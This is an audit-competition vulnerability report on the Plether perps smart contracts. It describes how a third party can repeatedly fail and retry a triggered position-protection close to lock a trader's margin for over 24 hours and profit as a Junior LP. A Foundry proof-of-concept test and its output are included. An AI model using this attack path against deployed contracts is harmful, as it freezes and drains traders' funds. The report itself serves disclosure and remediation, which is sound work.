# \#98924 [SC-High] Permissionless protection retries keep a triggered position locked and deny the owner's recovery action

**Submitted on Nov 10th 2026 at 23:17:33 UTC by @Paludo0x for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98924
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

Brief/Intro

A third party can atomically terminate and retry a triggered position-protection close, keeping the protection `Triggered` at transaction boundaries. The owner cannot amend its close limits or submit another close while the attacker repeats this transition, so position margin remains locked and exposed to market movement. An attacker who also owns Junior LP shares can profit from the resulting loss.

## Vulnerability Details

### Affected version and root cause

The affected version is the in-scope perps source at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. Position protection and permissionless keepers are active release features. The [Book's owner amendment](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328) is available only when the protection is `Latched` and the account has no pending order:

```solidity
function amendLatchedPositionProtectionCloseLimits(
    uint64 protectionId,
    PositionProtectionTypes.CloseFinancialLimits calldata limits
) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    _setCloseLimits(protection, limits);
    _emitCloseLimitsUpdated(protection);
}
```

On terminal failure, [the Book relatches the same protection](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L662-L667):

```solidity
delete _attemptProtectionIds[orderId];
retained = _positionMatches(protection);
emit PositionProtectionCloseAttemptFailed(protectionId, account, orderId, reason, retained);
if (retained) {
    protection.status = PositionProtectionTypes.PositionProtectionStatus.Latched;
    return true;
}
```

The [retry entrypoint](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L405) has no owner restriction, delay, or opportunity reserved for the owner. It accepts the transient `Latched` state and immediately creates the next child order:

```solidity
function retryPositionProtectionClose(
    uint64 protectionId
) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    _requireMatchingPosition(protection);

    IPositionProtectionRouterHost router = IPositionProtectionRouterHost(ROUTER);
    if (router.pendingOrderCounts(protection.account) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }

    if (protection.linkedOrderId == 0 || _attemptProtectionIds[protection.linkedOrderId] != 0) {
        revert PositionProtectionBook__InvalidLinkedOrder();
    }
    uint64 expectedOrderId = router.nextCommitId();
    linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER)
        .commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);
    if (linkedOrderId != expectedOrderId) {
        revert PositionProtectionBook__InvalidHostResponse();
    }
    _recordCloseAttempt(protection, linkedOrderId);
}
```

`_recordCloseAttempt` sets the status back to `Triggered`. A contract can therefore call `executeOrder` to end a failed or expired child and call `retryPositionProtectionClose` before the transaction returns. The owner never observes the `Latched` state between transactions. [Ordinary Router close commitment](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L312-L315) also rejects an account with an active protection:

```solidity
if (enforceProtectionLock && host.positionProtectionBook().activePositionProtectionId(account) != 0) {
    revert OrderRouter__ProtectionActive();
}
```

### Attack path

1. The attacker holds Junior LP shares. A trader has a protected position with a finite close-notional ceiling that permits execution at the trigger price.
2. The protection triggers and creates its first close attempt. A subsequent valid basket publication breaches the retained ceiling, so that attempt fails without closing the position.
3. In one transaction, the attacker executes that failure and permissionlessly retries. The Book briefly relatches and immediately returns to `Triggered` with a new pending close.
4. The attacker repeats the atomic expiry-and-retry transition. The owner cannot amend the ceiling while the child is live, and an ordinary close is blocked by the active protection.
5. The attacker can continue the same transition across successive deadlines while the owner remains unable to amend or submit an ordinary close. If the basket moves against the trapped position, an attacker who also owns Junior LP shares can liquidate and redeem an increased share of pool equity.

The freezing preconditions are a triggered protection, a subsequently breached owner ceiling, and inclusion of the attacker's terminal-and-retry transactions before an owner rescue transaction. The separate LP-profit example additionally requires an adverse market move. No privileged role or victim allowance is used.

### Relation to public findings and remediation

Cecuro MED-9 concerned retries that did not preserve trader-selected financial ceilings. The [October 21 fix `8a2853f80bce067656c1fd0fcf2dadc5892e2aee`](https://github.com/immunefi-team/audit-comp-plether/commit/8a2853f80bce067656c1fd0fcf2dadc5892e2aee) retained those ceilings and added owner amendment **after relatch**. This finding concerns denial of that new amendment by a permissionless atomic retry; the retained ceilings remain intact. The published [Router and keeper limitations](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1343-L1360) discuss lack of retries and prolonged `Latched` state. Here the attacker continually creates a live child and prevents `Latched` from being externally available.

The owner needs an atomic path to replace the close limits or exit the protection while a child is live, without requiring a separately contestable `Latched` transaction. A third-party retry must not be able to consume the owner's only recovery state indefinitely.

## Impact Details

The selected in-scope impact is **Temporary freezing of funds for at least 24 hours**. The affected funds are the trader's USDG position margin in `MarginClearinghouse`. Each atomic terminal-and-retry transaction restores a live child before the owner can call the `Latched`-only amendment, while the active protection blocks an ordinary close. The attacker can sustain this state across successive deadlines. The Junior LP withdrawal in the separate PoC test documents an economic incentive and the consequence of continued exposure; the requested impact is the inability to close the position or recover control of the locked margin.


## Proof of Concept

PoC Explanation

The attached file is `RetryJamLpExtraction.t.sol`, a single Foundry test source containing two tests. Place it in the repository root at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, then run this command from that root:

```bash
mkdir -p packages/perps/test/hound && cp RetryJamLpExtraction.t.sol packages/perps/test/hound/ && cd packages/perps && forge test --match-path test/hound/RetryJamLpExtraction.t.sol --match-test test_PermissionlessRetry --gas-limit 5000000000 -vv
```

Both tests use the repository's `PositionProtectionTest` deployment fixture, but open the trader position, fund and settle the attacker's LP deposit, refresh the mark, trigger protection, and execute and retry child orders through public entrypoints. The fixture deploys `LegacyOrderRouterHarness`, a subclass of production `OrderRouter`; the PoC uses its production V3 `commitOrder(OrderRequest)` method and does not call the test-only scalar overload. It installs the release six-feed basket, weights, inverse directions, VPI, margin, fee, and Router settings. Synthetic Pyth updates and USDG are the controlled external dependencies; the in-scope source is unchanged. The attacker is modeled as winning each contested transaction ordering; an owner who terminates a child and amends atomically first can escape. The increased Foundry gas limit lets one test transaction simulate many separate attacker transactions; it is not an on-chain block-size assumption.

The first test verifies the freezing impact directly. After a valid trigger and a later ceiling breach, the attacker uses one atomic failure-and-retry transaction followed by `1,417` expiry-and-retry cycles. At `86,437` elapsed seconds, the position remains open, the protection is `Triggered` with a pending child, and both the owner's amendment and ordinary V3 close revert with their exact errors.

The second test documents an economic incentive. In its fixture, the attacker deposits `1,000,000 USDG` as a Junior LP. The trader opens a `500,000`-size position with `3,000 USDG` margin. The protection triggers at a basket mark of `1.001`; its `500,600 USDG` notional ceiling permits that trigger price. A separate snapshot control confirms that timely execution at this trigger price closes successfully. The next mark is `1.0015`, which breaches the ceiling. The attacker immediately fails and retries the child, then maintains the lock for 60 expiry-and-retry cycles over one hour. At mark `1.003`, the attacker liquidates. The no-attack branch starts from the exact same snapshot: the initial attempt fails at `1.0015`, the owner amends, and its retry executes at that mark. Both branches redeem the attacker's LP shares after the same final market move and at the same final point in the test. This controlled price path demonstrates the consequence; it does not establish how often such a market move occurs.

Expected result in settlement-token atoms (`1 USDG = 1,000,000` atoms):

```text
[PASS] test_PermissionlessRetryLocksOwnerForMoreThan24Hours()
24h jam cycles: 1417
24h elapsed seconds: 86437
[PASS] test_PermissionlessRetryDivertsTraderCollateralToJammerLp()
jam cycles: 60
attacker LP cash: 1001199411406
baseline LP cash: 1000487382930
extra attacker LP cash: 712028476
victim balance after jam: 17149572573
victim balance after owner exit: 18824334209
extra victim loss: 1674761636
```

The extra `712.028476 USDG` is present in the LP's wallet after `claimRedeem`. It excludes the separate liquidation keeper reward, which is paid to the attack contract. The trader's clearinghouse balance is `1,674.761636 USDG` lower than in the owner-exit branch. These amounts support the motive and market consequence; the severity claim rests on the separate duration and owner-action assertions.

```
    bool[6] internal releaseInverted = [false, true, false, true, true, true];

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _configureRelease() internal {
        bytes32[] memory ids = new bytes32[](6);
        uint256[] memory weights = new uint256[](6);
        uint256[] memory bases = new uint256[](6);
        bool[] memory inversions = new bool[](6);
        for (uint256 i; i < 6; ++i) {
            ids[i] = releaseIds[i];
            weights[i] = releaseWeights[i];
            bases[i] = releaseBases[i];
            inversions[i] = releaseInverted[i];
        }
        PletherOracle releaseOracle =
            new PletherOracle(address(engine), address(pool), address(baseMockPyth), ids, weights, bases, inversions);
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        config.minOpenNotionalAssets = 1000e6;
        config.positionProtectionTriggerBountyAssets = 200_000;
        routerAdmin.proposeRouterConfig(config);
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig(address(releaseOracle)));
        vm.warp(routerAdmin.oracleConfigActivationTime());
        routerAdmin.finalizeOracleConfig();
        routerAdmin.finalizeRouterConfig();
        pletherOracle = releaseOracle;
        baseMockPyth.setSynchronizeLegacyUniquePrices(false);
        vm.warp(vm.getBlockTimestamp() + 4 days);
        router.updateMarkPrice(_releaseUpdateData(MARK_PRICE));
    }

    function _releaseUpdateData(uint256 targetMark) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime =
            router.nextExecuteId() < router.nextCommitId() ? _mockHistoricalPublishTime() : vm.getBlockTimestamp();
        MockPyth.FeedUpdate[] memory feeds = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            uint256 raw =
                releaseInverted[i] ? 1e24 / (releaseBases[i] * targetMark) : releaseBases[i] * targetMark / 1e8;
            feeds[i] = MockPyth.FeedUpdate(
                releaseIds[i],
                MockPyth.MockPrice(
                    int64(uint64(raw)), uint64(raw / 10_000), -8, publishTime, publishTime == 0 ? 0 : publishTime - 1
                )
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(feeds);
    }

    function _fundLpViaRouter() internal {
        settlementToken.mint(JAMMER_LP, LP_CAPITAL);
        vm.startPrank(JAMMER_LP);
        settlementToken.approve(address(juniorVault), LP_CAPITAL);
        uint256 depositId = juniorVault.requestDeposit(LP_CAPITAL, JAMMER_LP, JAMMER_LP);
        vm.stopPrank();
        vm.warp(juniorVault.depositEpochStart(depositId));
        router.settleLpEpoch(_releaseUpdateData(MARK_PRICE));
        uint256 claimable = juniorVault.claimableDepositRequest(depositId, JAMMER_LP);
        assertEq(claimable, LP_CAPITAL);
        vm.prank(JAMMER_LP);
        juniorVault.claimDeposit(depositId, claimable, JAMMER_LP, JAMMER_LP);
    }

    function _cashOutLpViaRouter() internal returns (uint256) {
        uint256 shares = juniorVault.maxRequestRedeem(JAMMER_LP);
        assertGt(shares, 0);
        vm.prank(JAMMER_LP);
        uint256 requestId = juniorVault.requestRedeem(shares, JAMMER_LP, JAMMER_LP);
        uint256 activation = juniorVault.depositEpochStart(requestId);
        if (vm.getBlockTimestamp() < activation) vm.warp(activation);
        router.settleLpEpoch(_releaseUpdateData(LIQUIDATION_MARK));
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, JAMMER_LP);
        assertEq(claimable, shares);
        vm.prank(JAMMER_LP);
        juniorVault.claimRedeem(requestId, claimable, JAMMER_LP, JAMMER_LP);
        return settlementToken.balanceOf(JAMMER_LP);
    }

    function _traderOrderRequest(bool isClose) internal view returns (OrderV3Types.OrderRequest memory request) {
        request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: CfdTypes.Side.LONG,
            sizeDelta: SIZE,
            marginDelta: isClose ? 0 : MARGIN,
            targetPrice: isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp()) + uint64(router.maxExecutionWindowSeconds()),
                executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function test_PermissionlessRetryDivertsTraderCollateralToJammerLp() public {
        _configureRelease();
        _fundLpViaRouter();
        router.updateMarkPrice(_releaseUpdateData(MARK_PRICE));
        OrderV3Types.OrderRequest memory opening = _traderOrderRequest(false);
        vm.prank(ALICE);
        uint64 openId = router.commitOrder(opening);
        OrderV3Types.ExecutionResult memory openResult = router.executeOrder(openId, _releaseUpdateData(MARK_PRICE));
        assertEq(uint8(openResult.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        (uint256 openedSize,,,,,,) = engine.positions(ALICE);
        assertEq(openedSize, SIZE);
        router.updateMarkPrice(_releaseUpdateData(MARK_PRICE));
        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, STOP);
        params.closeLimits.maxExecutionNotionalAssets = CEILING;
        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);
        bytes[] memory triggerData = _releaseUpdateData(STOP);
        vm.prank(TRIGGER_KEEPER);
        uint64 firstAttemptId = protectionActions.triggerPositionProtection(protectionId, triggerData);
        uint256 atTriggerSnapshot = vm.snapshotState();
        OrderV3Types.ExecutionResult memory timelyClose =
            router.executeOrder(firstAttemptId, _releaseUpdateData(STOP));
        assertEq(uint8(timelyClose.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        assertTrue(vm.revertToState(atTriggerSnapshot));
        RetryJammer jammer = new RetryJammer();
        uint256 start = vm.getBlockTimestamp();
        uint256 snapshot = vm.snapshotState();

        bytes[] memory breachData = _releaseUpdateData(BREACH);
        vm.prank(JAMMER_LP);
        uint64 attemptId = jammer.failAndRetry(
            address(router), address(protectionActions), firstAttemptId, protectionId, breachData
        );
        uint256 cycles;
        while (vm.getBlockTimestamp() < start + 1 hours + 1) {
            uint64 deadline = router.lifecycleBook().orderTiming(attemptId).executionDeadline;
            vm.roll(vm.getBlockNumber() + 1);
            vm.warp(uint256(deadline) + 1);
            vm.prank(JAMMER_LP);
            attemptId = jammer.expireAndRetry(address(router), address(protectionActions), attemptId, protectionId);
            ++cycles;
        }
        assertGt(cycles, 0);
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered)
        );
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _params(0, 0).closeLimits);
        OrderV3Types.OrderRequest memory ordinaryClose = _traderOrderRequest(true);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(ordinaryClose);
        bytes[] memory liquidationData = _releaseUpdateData(LIQUIDATION_MARK);
        vm.prank(JAMMER_LP);
        attemptId = jammer.failAndRetry(
            address(router), address(protectionActions), attemptId, protectionId, liquidationData
        );
        liquidationData = _releaseUpdateData(LIQUIDATION_MARK);
        vm.prank(JAMMER_LP);
        jammer.liquidate(address(router), ALICE, liquidationData);
        (uint256 attackSize,,,,,,) = engine.positions(ALICE);
        assertEq(attackSize, 0);
        uint256 victimAttackBalance = clearinghouse.balanceAssets(ALICE);
        uint256 attackEnd = vm.getBlockTimestamp();
        uint256 attackLpCash = _cashOutLpViaRouter();

        assertTrue(vm.revertToState(snapshot));
        OrderV3Types.ExecutionResult memory firstFailure =
            router.executeOrder(firstAttemptId, _releaseUpdateData(BREACH));
        assertEq(uint8(firstFailure.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _params(0, 0).closeLimits);
        vm.prank(ALICE);
        uint64 retryId = protectionActions.retryPositionProtectionClose(protectionId);
        OrderV3Types.ExecutionResult memory baselineResult = router.executeOrder(retryId, _releaseUpdateData(BREACH));
        assertEq(uint8(baselineResult.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        uint256 victimBaselineBalance = clearinghouse.balanceAssets(ALICE);
        vm.warp(attackEnd - 1);
        router.updateMarkPrice(_releaseUpdateData(LIQUIDATION_MARK));
        uint256 baselineLpCash = _cashOutLpViaRouter();
        console2.log("jam cycles:", cycles);
        console2.log("attacker LP cash:", attackLpCash);
        console2.log("baseline LP cash:", baselineLpCash);
        console2.log("extra attacker LP cash:", attackLpCash - baselineLpCash);
        console2.log("victim balance after jam:", victimAttackBalance);
        console2.log("victim balance after owner exit:", victimBaselineBalance);
        console2.log("extra victim loss:", victimBaselineBalance - victimAttackBalance);
        assertGt(attackLpCash, LP_CAPITAL, "attacker must withdraw more than its LP capital");
        assertGt(attackLpCash, baselineLpCash);
        assertLt(victimAttackBalance, victimBaselineBalance);
    }

    function test_PermissionlessRetryLocksOwnerForMoreThan24Hours() public {
        _configureRelease();
        _fundLpViaRouter();
        router.updateMarkPrice(_releaseUpdateData(MARK_PRICE));
        OrderV3Types.OrderRequest memory opening = _traderOrderRequest(false);
        vm.prank(ALICE);
        uint64 openId = router.commitOrder(opening);
        OrderV3Types.ExecutionResult memory opened = router.executeOrder(openId, _releaseUpdateData(MARK_PRICE));
        assertEq(uint8(opened.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        router.updateMarkPrice(_releaseUpdateData(MARK_PRICE));

        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, STOP);
        params.closeLimits.maxExecutionNotionalAssets = CEILING;
        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);
        bytes[] memory triggerData = _releaseUpdateData(STOP);
        vm.prank(TRIGGER_KEEPER);
        uint64 firstAttemptId = protectionActions.triggerPositionProtection(protectionId, triggerData);

        RetryJammer jammer = new RetryJammer();
        bytes[] memory breachData = _releaseUpdateData(BREACH);
        vm.prank(JAMMER_LP);
        uint64 attemptId = jammer.failAndRetry(
            address(router), address(protectionActions), firstAttemptId, protectionId, breachData
        );
        uint256 start = vm.getBlockTimestamp();
        uint256 cycles;
        while (vm.getBlockTimestamp() < start + 24 hours + 1) {
            uint64 deadline = router.lifecycleBook().orderTiming(attemptId).executionDeadline;
            vm.roll(vm.getBlockNumber() + 1);
            vm.warp(uint256(deadline) + 1);
            vm.prank(JAMMER_LP);
            attemptId = jammer.expireAndRetry(address(router), address(protectionActions), attemptId, protectionId);
            ++cycles;
        }

        assertGt(vm.getBlockTimestamp() - start, 24 hours);
        assertEq(router.pendingOrderCounts(ALICE), 1);
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered)
        );
        (uint256 positionSize,,,,,,) = engine.positions(ALICE);
        assertEq(positionSize, SIZE);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _params(0, 0).closeLimits);
        OrderV3Types.OrderRequest memory ordinaryClose = _traderOrderRequest(true);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(ordinaryClose);
        console2.log("24h jam cycles:", cycles);
        console2.log("24h elapsed seconds:", vm.getBlockTimestamp() - start);
    }
}

```
